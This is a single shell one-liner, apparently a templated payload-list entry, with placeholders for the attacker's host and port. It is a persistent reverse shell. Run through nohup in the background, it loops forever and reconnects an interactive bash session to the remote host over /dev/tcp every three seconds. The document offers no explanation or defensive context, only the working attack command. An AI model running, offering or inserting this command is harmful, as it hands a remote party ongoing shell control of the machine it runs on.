( nohup bash -c 'while :; do bash -i >& /dev/tcp/$LHOST§/{{ LPORT }} 0>&1; sleep 3; done' & ) &
